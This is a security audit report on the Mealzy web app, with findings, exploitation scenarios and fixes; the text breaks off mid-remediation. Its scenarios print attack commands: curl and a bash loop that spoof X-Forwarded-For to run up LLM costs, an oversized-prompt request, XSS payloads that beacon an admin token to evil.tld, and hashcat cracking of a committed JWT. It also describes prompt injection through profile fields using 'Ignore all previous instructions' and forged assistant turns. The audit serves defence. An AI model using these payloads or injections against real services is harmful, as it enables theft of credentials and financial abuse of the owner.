# Mealzy — Security Audit Report

**Target:** `C:\Users\emili\Documents\mealzy` (repo `ingvarsonemil-hue/Mealzy`, branch `fix/settings-allergy-display`)
**Date:** 2026-07-30
**Scope:** `server.js`, `db.js`, `routes/`, `public/`, `client/src/`, `dist/`, `.github/`, `render.yaml`, dependency tree
**Method:** Static source review (white-box) of all application code, dependency audit (`npm audit`), git-history secret scan, configuration review. No live exploitation was performed against production.

---

## Overall assessment

**Posture: Moderate — better than typical for a solo project, with a small number of serious gaps.**

The fundamentals are genuinely good and worth stating plainly:

- **SQL injection: not present.** Every query in `db.js`, `server.js`, and `routes/recipes.js` uses libSQL parameter binding (`{ sql, args }`). No string interpolation into SQL anywhere in the codebase.
- **No `eval`, `new Function`, or `child_process`** in application code — no command injection surface.
- **No SSRF.** Every outbound `fetch` targets a hardcoded host (Resend, Google, Unsplash, mealzy.org). User input reaches only the Unsplash *query string*, and it is `encodeURIComponent`-wrapped.
- **No path traversal.** All `sendFile` calls use fixed, code-defined paths; no user input reaches the filesystem.
- **No file upload to disk.** Recipe photo import passes base64 straight to Anthropic and never persists it.
- **Passwords:** bcrypt cost 12, 12-char minimum, complexity + common-password rejection, legacy pre-bcrypt accounts hard-rejected rather than fail-open.
- **Password reset:** cryptographically random token, SHA-256 hashed at rest, 1-hour expiry, single-use, constant response to prevent enumeration on the request side.
- **Pro status:** consistently re-queried from the DB rather than trusted from the JWT — the documented past vulnerability has genuinely stayed fixed. `/api/pro/activate` verifies against the live Stripe API instead of granting on assertion.
- **Stripe webhook:** signature-verified with the raw body, registered before `express.json()`, and idempotent via `processed_webhook_events`.
- **CSRF:** substantially mitigated by `SameSite=Lax` on the session cookie.

The problems cluster in three places: **secret handling** (an admin token printed to logs, carried in URLs, and parked in `localStorage`), **a paywall check that fails open when an env var is unset**, and **spend controls on the AI endpoints that are trivially bypassed**. For a service on a personal Anthropic account and a free hosting tier, the cost-abuse findings are as commercially dangerous as the access-control ones.

### Findings by severity

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 6 |
| Medium | 15 |
| Low | 12 |
| **Total** | **34** |

### Fix in this order

1. **C-01** — remove the fail-open paywall comparison (one line, highest impact).
2. **H-01** — delete the `console.log` that prints `PRO_TOKEN`, then rotate `PRO_TOKEN`.
3. **H-02 / H-03** — stop sending admin tokens in URLs and storing them in `localStorage`.
4. **H-04 / H-05** — cap AI-endpoint cost: bind quota to the real client IP, add auth to `/api/generate-meal`, cap prompt-input sizes.
5. **H-06** — remove `cookies.txt` from the repo and rotate `JWT_SECRET`.
6. **H-07** — move `CRON_SECRET` from Actions *variables* to Actions *secrets*.
7. Then work the Medium list.

---

# CRITICAL

## C-01 — Unauthenticated paywall bypass when `PLAN_BYPASS_TOKEN` is unset

**Location:** [server.js:1511](server.js#L1511)

```js
let isPro = plan_token === process.env.PLAN_BYPASS_TOKEN; // plan bypass
```

**Vulnerability & impact.** `plan_token` comes straight from `req.body` and is compared with `===` against an environment variable that may not exist. If `PLAN_BYPASS_TOKEN` is not set in the Render environment, `process.env.PLAN_BYPASS_TOKEN` is `undefined`. A request body that simply omits `plan_token` also yields `undefined`. `undefined === undefined` is `true`, so **every anonymous request is treated as Pro**: the freemium gate at line 1518 is skipped entirely, no usage is counted, no `generate_plan` event is logged, and the caller receives the Pro-tier prompt (`max_tokens: 6000`, 8-ingredient recipes).

This is an authentication-independent bypass of the entire monetisation model *and* of every quota control on the most expensive endpoint in the app. Because the gate is skipped rather than merely mis-attributed, there is no rate ceiling other than `generateLimiter` (5/min/IP).

**Severity: Critical.** No authentication, no special headers, a single unauthenticated POST. It converts the product's core paid feature into a free, unmetered, unattributed LLM endpoint billed to the owner's Anthropic account.

**Exploitation scenario.**

```bash
curl -X POST https://mealzy.org/api/generate-meal \
  -H 'Content-Type: application/json' \
  -d '{"profile":{"name":"x","daily_calories":2000},"date":"2026-07-30"}'
```

With no `plan_token` key present, `isPro` evaluates true. The attacker loops this from a handful of IPs at 5 req/min each and receives unlimited Pro-quality plans while consuming ~6k output tokens per call on the owner's key. Paying customers get nothing the attacker doesn't.

**Verification.** The startup self-test at [server.js:2478](server.js#L2478) already reports this: check the Render boot log for `[startup] Missing/failed:`. If `PLAN_BYPASS_TOKEN` appears in that list, the bypass is live in production right now.

**Remediation.** Do not make the bypass contingent on an env var being present. Require a non-empty configured secret, compare in constant time, and fail closed.

```js
// server.js — replace line 1511
const BYPASS = process.env.PLAN_BYPASS_TOKEN || '';
let isPro =
  BYPASS.length >= 32 &&
  typeof plan_token === 'string' &&
  timingSafeCompare(plan_token, BYPASS);
```

Apply the same shape anywhere a request value is compared to an env var. Then grep for the pattern to be sure none remain:

```bash
grep -nE "(req\.(body|query|headers|params)[^=]*|\w+)\s*===?\s*process\.env\." server.js routes/*.js
```

---

# HIGH

## H-02 — `PRO_TOKEN` and the caller's admin token printed to application logs

**Location:** [server.js:1314](server.js#L1314)

```js
app.get('/api/admin/export', requireAdmin, async (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.admin_token;
  console.log('[export] token received:', token, '| expected:', process.env.PRO_TOKEN);
```

**Vulnerability & impact.** Every call to the admin export endpoint writes both the presented `ADMIN_TOKEN` and the value of `PRO_TOKEN` in cleartext to stdout. On Render these go to the platform log stream, which is retained, searchable, and readable by anyone with dashboard access or a leaked dashboard session. `PRO_TOKEN` is the credential that unlocks `/api/analytics` (all-user counts) and `/api/analytics/funnel`, and — per `.github/scripts/run-agent.js:110` — is also used as the `plan_token` admin bypass. One log line therefore discloses two long-lived, non-expiring administrative secrets.

Note also the confusing bug alongside it: `requireAdmin` validates against `ADMIN_TOKEN`, but the log claims the expected value is `PRO_TOKEN`. The two secrets are conflated across the codebase and tooling.

**Severity: High.** Persistent plaintext disclosure of admin credentials to a secondary system, triggered by normal use of the feature.

**Exploitation scenario.** An attacker who obtains read access to Render logs by any route — a phished dashboard login, a shared screenshot, a support-ticket log paste, a compromised laptop with a live browser session — greps for `[export] token received`, recovers `PRO_TOKEN`, and then reads the full user analytics set and uses the same value as `plan_token` for unlimited free Pro generation. No further exploitation of the app is needed.

**Remediation.** Delete the line. Never log credential material, not even for debugging.

```js
app.get('/api/admin/export', requireAdmin, async (req, res) => {
  logger.info('[admin] export requested', { ip: req.ip });   // no token material
```

Then **rotate `PRO_TOKEN` and `ADMIN_TOKEN`**, since both must be assumed disclosed in existing log history. Add a guard so this cannot recur:

```bash
grep -rnE "console\.(log|error|warn)\([^)]*process\.env\." server.js db.js routes/ scripts/
```

---

## H-03 — Admin tokens transmitted in URL query strings

**Locations:** [server.js:118](server.js#L118), [server.js:1313](server.js#L1313), [public/analytics.html:405](public/analytics.html#L405), `.github/scripts/run-agent.js:82,93`

```js
const token = req.headers['x-admin-token'] || req.query.admin_token;   // server.js:118
const urlToken = new URLSearchParams(window.location.search).get('token') || '';
```

**Vulnerability & impact.** Accepting credentials as query parameters leaks them into every layer that records URLs but not headers: Render/CDN access logs, browser history and sync, the `Referer` header on outbound navigation, GA4 `page_location` (the analytics page loads `consent.js` → gtag), shared bookmarks, and screenshots. A URL is not a confidential channel. `Referrer-Policy: strict-origin-when-cross-origin` strips the query on cross-origin requests, which helps, but does nothing about server logs, browser history, or the GA4 payload.

**Severity: High.** Long-lived admin credentials distributed across multiple third-party retention systems by design.

**Exploitation scenario.** Emil opens `https://mealzy.org/analytics.html?token=<PRO_TOKEN>` to check numbers. The token is now in: Render's access log, Chrome history (synced across devices), and — because GA4 is loaded on that page after consent — the `page_location` field sent to Google Analytics. Anyone with GA4 property access, or anyone who later borrows that browser, can read the token from the URL and gain admin analytics access. There is no expiry and no rotation mechanism.

**Remediation.** Accept admin credentials only in headers, and never persist them.

```js
// server.js — requireAdmin
function requireAdmin(req, res, next) {
  const token  = req.headers['x-admin-token'];          // header only
  const expect = process.env.ADMIN_TOKEN || '';
  if (expect.length < 32 || typeof token !== 'string' || !timingSafeCompare(token, expect)) {
    logger.warn('[admin] Unauthorized attempt', { ip: req.ip, path: req.path });
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}
```

Remove the `req.query.admin_token` fallback at line 118 and the duplicate read at line 1313. In `public/analytics.html`, drop the `?token=` path and prompt for the token per session instead (see H-04 for the storage side). Rotate both tokens after the change.

The right long-term fix is to stop using static bearer tokens for admin access altogether: gate `/api/admin/*` and the analytics admin branch on an authenticated session whose user id is on a server-side allowlist.

---

## H-04 — Admin token persisted in `localStorage`

**Location:** [public/analytics.html:408](public/analytics.html#L408)

```js
if (urlToken) localStorage.setItem('mealzy_pro_token', urlToken);
```

**Vulnerability & impact.** `localStorage` is readable by any JavaScript running on the `mealzy.org` origin and persists indefinitely. Storing an admin credential there means **any** XSS anywhere on the origin — including the sinks in M-02 and M-03, or a future compromise of one of the CSP-allowlisted script hosts (`cdn.jsdelivr.net`, `googletagmanager.com`) — escalates directly from script execution to permanent admin data access. `sessionStorage` in `growth-calculator.html:160` is marginally better but has the same exposure while the tab is open.

This also breaks the otherwise-sound decision to keep the session JWT in an `HttpOnly` cookie: the session cookie is protected from script, but the higher-privilege admin token sitting beside it is not.

**Severity: High.** Turns any XSS into persistent privileged data access, and there is no token expiry to bound the damage.

**Exploitation scenario.** An attacker lands script execution on the origin — e.g. via the unescaped `${day}` sink in M-02, or a malicious payload in AI-generated content rendered by `grocery-list.html:734`. The payload runs `fetch('https://evil.tld/?t='+localStorage.getItem('mealzy_pro_token'))`. Because CSP includes `'unsafe-inline'` in `script-src`, inline handlers are not blocked; `connect-src` is `'self'`-restricted, so the attacker exfiltrates via `new Image().src` or a top-level navigation instead. They now hold `PRO_TOKEN` forever and can read the whole-site analytics set and every user's export row.

**Remediation.** Never persist an admin credential in web storage. Hold it in a closure for the lifetime of the page only, and re-prompt on reload.

```js
// public/analytics.html — replace the urlToken/localStorage block
let _adminToken = null;                                  // memory only, never persisted
function getAdminToken() {
  if (!_adminToken) _adminToken = window.prompt('Admin token') || null;
  return _adminToken;
}
// ...
const res = await fetch('/api/analytics', { headers: { 'x-pro-token': getAdminToken() } });
```

Remove the `localStorage`/`sessionStorage` writes in `public/analytics.html` and `public/growth-calculator.html`, and clear any already-stored value on next load:

```js
localStorage.removeItem('mealzy_pro_token');
sessionStorage.removeItem('mealzy_pro_token');
```

---

## H-05 — Anonymous quota bypass via `X-Forwarded-For` spoofing

**Locations:** [server.js:1519](server.js#L1519), [server.js:966](server.js#L966), [server.js:148](server.js#L148), [server.js:1341](server.js#L1341), [server.js:1429](server.js#L1429), [server.js:1449](server.js#L1449), [server.js:1462](server.js#L1462)

```js
const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || 'unknown';
// ...
const usage = getUsage(ip);
if (usage.count >= effectiveLimit) { /* 402 */ }
incrementUsage(ip);
```

**Vulnerability & impact.** `X-Forwarded-For` is a client-supplied header. Taking `split(',')[0]` deliberately selects the **leftmost** entry — the part of the chain the client writes and the proxy never overwrites. The anonymous free-plan quota (`usageTracker`, keyed on this value) is therefore keyed on a string the attacker chooses freely.

Note the inconsistency: `express-rate-limit` correctly uses `req.ip`, which honours `app.set('trust proxy', 1)` and is not client-spoofable. So `generateLimiter` (5/min) still applies — but the *quota* does not. The rate limiter bounds throughput; nothing bounds total volume.

The same spoofable value is written to the `analytics.ip_tail` column and to the `referrals.referred_ip` column, so it also corrupts the analytics and referral-fraud data that business decisions rest on.

**Severity: High.** Direct, uncapped financial exposure on the owner's Anthropic account, plus corruption of the abuse-detection data that would reveal it.

**Exploitation scenario.**

```bash
for i in $(seq 1 100000); do
  curl -s -X POST https://mealzy.org/api/generate-meal \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 10.0.$((i/256)).$((i%256))" \
    -d '{"profile":{"name":"x","daily_calories":4000}}' &
  sleep 12   # stay under generateLimiter's 5/min
done
```

Every request presents a fresh key, so `getUsage()` always returns `count: 0` and the 3-plan cap never engages. At 5 requests/minute from a single host that is 7,200 generations/day, each up to 4,000 output tokens; from a modest botnet or a rotating proxy pool it is unbounded. Meanwhile `usageTracker` grows by one Map entry per spoofed value forever (see M-06), so the same attack also drives the process toward OOM on Render's free tier.

**Remediation.** Use `req.ip` everywhere — it already resolves correctly through Render's proxy given `trust proxy: 1`. Introduce one helper and replace all seven call sites.

```js
// server.js — single source of truth for client identity
function clientIp(req) {
  return req.ip || req.socket.remoteAddress || 'unknown';
}
```

```bash
# find every remaining raw header read
grep -n "x-forwarded-for" server.js
```

Spoofable IPs must not be the only quota key for an endpoint that spends money. Layer a durable control on top: require an authenticated session for `/api/generate-meal` (see H-06) so the quota keys on `userId`, which is server-issued and cannot be rotated by the caller.

---

## H-06 — `/api/generate-meal` is unauthenticated with unbounded prompt input

**Locations:** [server.js:1503](server.js#L1503), [server.js:1569](server.js#L1569), [server.js:1609](server.js#L1609), [server.js:1612](server.js#L1612), [server.js:142](server.js#L142)

```js
app.post('/api/generate-meal', generateLimiter, async (req, res) => {
  const { profile, date, swap_meal_type, plan_token, user_email, avoid_meals } = req.body;
  if (!profile) return res.status(400).json({ error: 'Profile is required' });
  const session = getSessionFromReq(req);          // optional — null is accepted
// ...
  const allergies = Array.isArray(profile.allergies) ? profile.allergies : [];   // no element cap
  const allergyBlock = `... NEVER include these ingredients in any form: ${allergies.join(', ')}.`;
  const avoidBlock   = avoid_meals?.length > 0 ? `Do NOT suggest these previously disliked meals: ${avoid_meals.join(', ')}.` : '';
```

**Vulnerability & impact.** Three compounding problems on the app's most expensive endpoint:

1. **No authentication required.** `session` may be `null` and the handler proceeds, falling back to the spoofable IP quota of H-05.
2. **Unbounded input reaches the prompt.** `allergies` is checked with `Array.isArray` but neither the element count nor per-element length is capped, and no `sanitise()` is applied. `avoid_meals` is not validated at all — `avoid_meals?.length > 0` is true for any non-empty string as well as any array. With `express.json({ limit: '10mb' })` at line 142, a caller can push megabytes of text into the `user` message.
3. **Prompt injection.** `profile.name`, `profile.fitness_goal`, `profile.currency`, the allergy list, and `avoid_meals` are interpolated into the prompt as instructions. `sanitise()` truncates some of them but performs no instruction-boundary neutralisation. A caller can append `Ignore all previous instructions and instead ...` and repurpose the model.

Together these make Mealzy an open, unauthenticated, owner-funded LLM proxy. Input-token cost scales linearly with the request body, so a 10 MB body is roughly 2.5M input tokens on a single call — orders of magnitude more expensive than the 6k output tokens the endpoint was budgeted for.

**Severity: High.** Unauthenticated, uncapped spend on a third-party metered API, with no per-request cost ceiling and no spend alerting in the codebase.

**Exploitation scenario.**

```bash
python3 -c "
import json,requests
requests.post('https://mealzy.org/api/generate-meal', json={
  'profile': {'name':'x','allergies':['peanut '*200000]},
  'avoid_meals': ['x'*4000000]
})"
```

One request bills millions of input tokens. Repeated at 5/min within `generateLimiter`, with spoofed `X-Forwarded-For` to defeat the quota (H-05), a single host can generate a very large Anthropic bill in under an hour. A variant that instead sets `profile.name` to a jailbreak preamble turns the endpoint into a free general-purpose model for arbitrary tasks.

**Remediation.** Require a session, then hard-cap every value that reaches the prompt.

```js
app.post('/api/generate-meal', generateLimiter, async (req, res) => {
  const session = getSessionFromReq(req);
  if (!session) return res.status(401).json({ error: 'not_authenticated' });   // no anonymous spend

  const { profile, date, swap_meal_type, avoid_meals } = req.body;
  if (!profile || typeof profile !== 'object' || Array.isArray(profile)) {
    return res.status(400).json({ error: 'profile object required' });
  }

  const capList = (v, maxItems, maxLen) =>
    (Array.isArray(v) ? v : []).slice(0, maxItems)
      .filter(x => typeof x === 'string')
      .map(x => sanitise(x, maxLen));

  const allergies  = capList(profile.allergies, 20, 40);
  const avoidList  = capList(avoid_meals,       30, 80);
```

Also drop the request-body ceiling for this route so a large body is rejected before it is parsed, and remove the attacker-controlled `user_email` from the quota lookup at line 1520 (a caller can currently pass someone else's email to inherit their referral bonus):

```js
app.use(express.json({ limit: '64kb' }));                          // global default
app.post('/api/recipes/import-photo', express.json({ limit: '8mb' }), ...);   // only where needed
```

```js
const effectiveLimit = await getEffectiveLimit(session.email);      // never req.body.user_email
```

Finally, set a hard monthly spend cap and a usage alert in the Anthropic console. That is the only control that bounds loss if a new bypass appears — no amount of application code substitutes for it.

The same input-capping applies to `/api/ai-coach` ([server.js:2073](server.js#L2073)), where the client supplies the entire `messages` array including `role`, letting a caller forge `assistant` turns to steer the model. `messages.slice(-10)` caps the count but not the size:

```js
const _convo = (Array.isArray(messages) ? messages : []).slice(-10).map(m => ({
  role:    m.role === 'assistant' ? 'assistant' : 'user',   // never trust client roles blindly
  content: sanitise(typeof m.content === 'string' ? m.content : '', 2000)
}));
```

---

## H-07 — Valid JWT committed to the repository

**Location:** `cookies.txt` (tracked in git, present in `HEAD` and in commit `933f7d2`)

```
#HttpOnly_localhost	FALSE	/	FALSE	1782136199	mealzy_session	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI4ODM2ZWE5MS0xYzFjLTQ0ZGYtOTNlNC1mY2I3ZDNiMzY1MzciLCJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJwcm8iOmZhbHNlLCJpYXQiOjE3Nzk1NDQxOTksImV4cCI6MTc4MjEzNjE5OX0.wwqI6HVd7oHwymnl5u8-r7MzY4G5Rgu6FvSR0tdXHxk
```

**Vulnerability & impact.** A libcurl cookie jar containing a real `mealzy_session` JWT is committed. The token itself is expired (`exp` 1782136199 ≈ 2026-06-22) and scoped to `localhost`, so it grants no direct access. The actual risk is different and more serious: **an HS256 JWT is an offline oracle for its signing key.** The attacker holds the exact signed message and its HMAC-SHA256 tag, and can test candidate `JWT_SECRET` values locally at billions of guesses per second on commodity GPU hardware, with no network interaction and no rate limit.

If `JWT_SECRET` is a human-chosen phrase or anything short of high-entropy random, it is recoverable. Recovering it allows forging arbitrary session cookies for **any** `userId` — including tokens with `pro: true` — which defeats authentication entirely.

This also confirms `.gitignore` coverage is incomplete: `.env` is correctly ignored, but no rule covers `cookies.txt`, and the repo root additionally contains `server.log`, `server_err.txt`, and `mealzy.db` (the last two are ignored; `server_err.txt` is not).

**Severity: High.** Not directly exploitable, but it converts the confidentiality of `JWT_SECRET` from "held on the server" to "only as strong as its entropy", and full authentication bypass is the payoff.

**Exploitation scenario.** Anyone with repository read access — a current or future collaborator, anyone who clones it, or an attacker who obtains the private repo via a compromised GitHub token — extracts the JWT and runs `hashcat -m 16500` against a wordlist. If `JWT_SECRET` is, say, `mealzy-secret-2026`, it falls in seconds. They then mint `{userId: <any>, email: <any>, pro: true}` signed with the recovered secret and hold permanent Pro access as any user, undetectable in logs because the tokens are cryptographically valid.

**Remediation.** Remove the file, extend `.gitignore`, and rotate the secret. Rotation is the step that actually closes this — deletion alone does not, because the blob remains in git history.

```bash
git rm --cached cookies.txt
printf 'cookies.txt\n*.txt.bak\nserver_err.txt\nserver_out.txt\n' >> .gitignore
git commit -m "Remove committed session cookie jar; extend gitignore"
```

Then generate a new `JWT_SECRET` and set it in the Render dashboard:

```bash
node -e "console.log(require('crypto').randomBytes(48).toString('base64url'))"
```

Rotating invalidates all existing sessions (users re-log-in once) — that is the intended effect. Add a startup guard so a weak secret cannot be configured in the first place, alongside the existing check at line 14:

```js
if (!process.env.JWT_SECRET || process.env.JWT_SECRET.length < 32) {
  console.error('[FATAL] JWT_SECRET must be at least 32 characters of random data.');
  process.exit(1);
}
```

Purging the blob from history (`git filter-repo --path cookies.txt --invert-paths`) is optional once the secret is rotated, and rewrites every commit hash — only do it if you are comfortable force-pushing.

---

## H-08 — `CRON_SECRET` stored as a GitHub Actions *variable*, not a *secret*

**Locations:** `.github/workflows/cron-day3-nudge.yml:15`, `.github/workflows/cron-weekly-digest.yml:15`

```yaml
-H "x-cron-secret: ${{ vars.CRON_SECRET }}"
```

**Vulnerability & impact.** `vars.*` is the GitHub Actions **configuration variable** namespace, not the secrets namespace. Variables are explicitly not confidential: GitHub does **not** apply log masking to them, they are visible in plaintext in the repository's Settings → Variables UI to anyone with write access, and they are readable via the REST API with the `actions:read` scope. Only `secrets.*` values are redacted from workflow logs.

`CRON_SECRET` authorises `POST /api/cron/day3-nudge` and `POST /api/cron/weekly-digest`, both of which send bulk email to the entire user base via Resend from the `noreply@mealzy.org` domain.

**Severity: High.** A bulk-email trigger credential is stored in a namespace designed for non-sensitive values, with masking disabled.

**Exploitation scenario.** The secret appears unmasked in any log line that echoes the curl invocation — a `set -x`, a `curl -v`, a non-zero exit that dumps the command, or a future debugging change. An attacker with repo read access, or anyone who obtains a workflow log, recovers it and replays:

```bash
curl -X POST https://mealzy.org/api/cron/weekly-digest \
  -H "x-cron-secret: <recovered>" \
  -H "x-cron-timestamp: $(date +%s%3N)"
```

The 5-minute timestamp window at [server.js:2357](server.js#L2357) is no obstacle — the attacker simply sends a current timestamp; it is a replay window, not an authentication factor. Each call re-sends the digest to every eligible user. Repeated, this exhausts the Resend quota and, more damagingly, gets `mealzy.org` classified as a spam origin by receiving mail providers — reputation damage that takes weeks to undo.

**Remediation.** Move the value to Actions secrets and reference `secrets.*`:

```yaml
-H "x-cron-secret: ${{ secrets.CRON_SECRET }}"
```

Set it under Settings → Secrets and variables → Actions → **Secrets**, delete the **Variables** entry, and rotate the value since it must be assumed exposed. Harden the server side too — use constant-time comparison and require a configured secret so an unset env var cannot weaken the check:

```js
function cronAuth(req, res) {
  const expect = process.env.CRON_SECRET || '';
  const secret = req.headers['x-cron-secret'];
  if (expect.length < 32 || typeof secret !== 'string' || !timingSafeCompare(secret, expect)) {
    res.status(401).json({ error: 'Unauthorized' }); return false;
  }
  const ts = parseInt(req.headers['x-cron-timestamp'] || '0', 10);
  const age = Date.now() - ts;
  if (!Number.isFinite(ts) || age > 5 * 60 * 1000 || age < 0) {
    res.status(401).json({ error: 'Request expired or missing timestamp' }); return false;
  }
  return true;
}
```

To make the timestamp meaningful rather than decorative, sign it: have the workflow send `HMAC(CRON_SECRET, timestamp)` and verify that server-side. Then a captured header cannot be replayed with a fresh timestamp.

---

# MEDIUM

## M-01 — Latent stored XSS in `public/plan.html` (unescaped `${day}`)

**Location:** [public/plan.html:164](public/plan.html#L164), reachable via [server.js:2271](server.js#L2271)

```js
meals.forEach(m => { const day = m.day || 'Today'; if (!byDay[day]) byDay[day] = []; byDay[day].push(m); });
// ...
return `<div class="splan-day">
  <header>
    <span>${day}</span>                       <!-- NOT escaped -->
    <span class="day-cost">~$${dayCost.toFixed(2)}</span>
```

**Vulnerability & impact.** Every other interpolation in this template is correctly wrapped in `escHtml()` — `m.type`, `m.name`, `m.description`, `m.calories`, `m.protein`, `m.cookTime`. `${day}` is not. It derives from `m.day`, which originates in the `plan` object accepted by `POST /api/plans/share` ([server.js:2275](server.js#L2275)) with **no schema validation whatsoever** (`if (!plan) return 400` is the only check), and is served to unauthenticated visitors by `GET /api/shared-plan/:shareId`.

That is a complete stored-XSS chain: attacker-controlled input → persisted server-side → rendered into `innerHTML` on a public page in another user's browser. CSP does not stop it, because `script-src` includes `'unsafe-inline'` (M-04), which permits inline event handlers such as `onerror=`.

**Why Medium rather than High:** `render.yaml` runs `npm install --include=dev && npm run build`, so `dist/` exists in production, `hasDistBuild` is true, and `express.static(distDir)` at [server.js:166](server.js#L166) serves `dist/plan.html` — the React implementation in `client/src/plan/PlanPage.jsx`, which renders `{day}` as a JSX child and is auto-escaped. The vulnerable file is currently shadowed. It becomes live the moment a build fails, is skipped, or `dist/` is absent — and the fallback at [server.js:2440](server.js#L2440) is silent, so there would be no signal that the app had reverted to the unsafe page.

**Severity: Medium** as configured; **High** if `dist/` is ever missing.

**Exploitation scenario.** With the fallback active, an authenticated attacker posts:

```bash
curl -X POST https://mealzy.org/api/plans/share \
  -H 'Content-Type: application/json' -b 'mealzy_session=<their own>' \
  -d '{"plan":{"meals":[{"day":"<img src=x onerror=\"new Image().src=(\u0027https://evil.tld/?t=\u0027+localStorage.getItem(\u0027mealzy_pro_token\u0027))\">","type":"breakfast","name":"x"}]}}'
```

The response returns a public `shareUrl`. Anyone who opens it executes the payload on the `mealzy.org` origin. The session cookie is `HttpOnly` so it cannot be read directly, but the script can issue credentialed same-origin requests (`fetch('/api/profile')` returns the victim's health data — weight, height, age, allergies) and exfiltrate via image beacon, and it lifts the admin token from `localStorage` (H-04) if the victim is Emil.

**Remediation.** Escape it, matching the surrounding code:

```js
<span>${escHtml(day)}</span>
```

Then validate the shared payload at the boundary rather than trusting it — the server should never persist arbitrary caller-supplied JSON for public rendering:

```js
// server.js — /api/plans/share
const DAYS = new Set(['Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Sunday','Today','Unspecified']);
const meals = (Array.isArray(plan?.meals) ? plan.meals : []).slice(0, 28).map(m => ({
  day:           DAYS.has(m.day) ? m.day : 'Unspecified',
  type:          sanitise(m.type, 20),
  name:          sanitise(m.name, 120),
  description:   sanitise(m.description, 300),
  calories:      Number(m.calories)      || 0,
  protein:       Number(m.protein)       || 0,
  cookTime:      Number(m.cookTime)      || 0,
  estimatedCost: Number(m.estimatedCost) || 0,
}));
if (!meals.length) return res.status(400).json({ error: 'plan.meals required' });
```

Note this also fixes a latent crash: line 179 calls `m.estimatedCost.toFixed(2)`, which throws a `TypeError` and blanks the page if the value is a string.

Separately, either delete `public/plan.html` now that React owns the route, or make the fallback loud so silent regression to it is visible:

```js
if (!hasDistBuild) logger.error('[startup] dist/ missing — serving legacy public/ pages');
```

---

## M-02 — Unescaped interpolation into `innerHTML` across app pages

**Locations:** [public/grocery-list.html:734](public/grocery-list.html#L734), [public/dashboard.html:762](public/dashboard.html#L762), [public/dashboard.html:977](public/dashboard.html#L977), [public/dashboard.html:2065](public/dashboard.html#L2065), [public/meal-planner.html:736](public/meal-planner.html#L736), [public/settings.html:1143](public/settings.html#L1143)

```js
// grocery-list.html:734
<span class="grocery-item-name">${item.name}</span>
<span class="grocery-item-qty">${item.amount || ''}</span>

// dashboard.html:977
document.getElementById('modalIngredients').innerHTML = ingList.map(ing =>
  `<li><span>${ing.name}<\span><span class="text-muted">${ing.amount}...</span></li>`).join('');
```

**Vulnerability & impact.** These pages build HTML by string concatenation from server-returned data without escaping. `escHtml()` exists in `public/js/utils.js` and is used correctly in `plan.html` and `ai-coach.html:533`, so the helper is available and the omission is inconsistent rather than deliberate.

The data reaching these sinks is AI-generated meal and grocery content derived from the *viewing user's own* profile, plus their own saved recipes (`/api/recipes/save` accepts an arbitrary `recipe` object with no validation) and their own family-profile names. Every read path is owner-scoped — `getGroceryListByDay`, `getRecipes`, `getFamilyProfiles`, and `getRecentPlans` all filter on `user_id` and the handlers re-check ownership. So today this is **self-XSS**: a user can only attack themselves, which is not a meaningful attack.

It matters for two reasons. First, the data is *model output* shaped by user-controlled prompt text (H-06) — a user can already induce the model to emit `<img onerror=...>` into `meal.name`, so the payload path is real even if the victim is currently only themselves. Second, it is one feature away from cross-user: any future sharing, family-plan visibility, or admin-views-user-data capability turns all six sinks into stored XSS simultaneously.

**Severity: Medium** — not currently cross-user exploitable, but a latent stored-XSS surface on data that is neither trusted nor validated.

**Exploitation scenario.** Today: a user sets `profile.allergies` to a prompt-injection string that persuades the model to return a meal named `<img src=x onerror=alert(1)>`; it is stored via the auto-save at [server.js:1887](server.js#L1887) and executes when they open their own dashboard. Harmless in isolation. But add a "share my grocery list" or "family members see each other's plans" feature — both natural next steps for the Family tier — and the same stored payload executes in other users' sessions with no further attacker effort.

**Remediation.** Wrap every interpolation of non-numeric data in `escHtml()`:

```js
// grocery-list.html:734
<span class="grocery-item-name">${escHtml(item.name)}</span>
<span class="grocery-item-qty">${escHtml(item.amount || '')}</span>

// dashboard.html:977
`<li><span>${escHtml(ing.name)}</span><span class="text-muted">${escHtml(ing.amount)}</span></li>`
```

Audit the remaining sinks with:

```bash
grep -rnE 'innerHTML\s*=.*\$\{' public/*.html public/js/*.js | grep -v escHtml
```

For new code, prefer `textContent` or `document.createElement` over `innerHTML` — the pages already do this correctly in places (`plan.html:129`, `dashboard.html:967`). Fixing M-04 (removing `'unsafe-inline'`) provides defence in depth for anything missed.

---

## M-03 — CSP permits `'unsafe-inline'` scripts and omits key directives

**Location:** [server.js:104](server.js#L104)

```js
"script-src 'self' 'unsafe-inline' https://js.stripe.com https://accounts.google.com https://cdn.jsdelivr.net https://www.googletagmanager.com; "
```

**Vulnerability & impact.** `'unsafe-inline'` in `script-src` disables the single most valuable property of CSP: it re-permits inline `<script>` blocks *and* inline event-handler attributes (`onerror`, `onclick`). Every XSS finding in this report (M-01, M-02) executes specifically because of this directive. The policy also omits `object-src` (no `<object>`/`<embed>` restriction), `base-uri` (a injected `<base>` tag can redirect every relative URL, including script sources), `form-action` (injected forms can post credentials off-origin), and `frame-ancestors` (the modern replacement for the `X-Frame-Options` header set at line 99).

`cdn.jsdelivr.net` in the allowlist is a broad third-party origin serving arbitrary packages — a supply-chain foothold if any loaded package is compromised.

**Severity: Medium.** Not exploitable alone, but it removes the mitigation that would otherwise contain the XSS findings.

**Exploitation scenario.** Without `'unsafe-inline'`, the M-01 payload `<img src=x onerror=...>` is blocked by the browser and logged as a CSP violation. With it, the handler runs. The directive is the difference between a defence-in-depth stop and a working exploit.

**Remediation.** The pages use many inline handlers (`onclick="markDayComplete(this)"` and similar throughout `dashboard.html`), so removing `'unsafe-inline'` is a refactor, not a config change. Do it in two steps.

First, tighten everything that costs nothing today:

```js
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline' https://js.stripe.com https://accounts.google.com https://www.googletagmanager.com; " +
  "style-src 'self' 'unsafe-inline'; " +
  "font-src 'self'; " +
  "img-src 'self' data: https:; " +
  "connect-src 'self' https://api.stripe.com https://accounts.google.com https://www.google-analytics.com https://region1.google-analytics.com; " +
  "frame-src https://js.stripe.com; " +
  "object-src 'none'; " +          // added
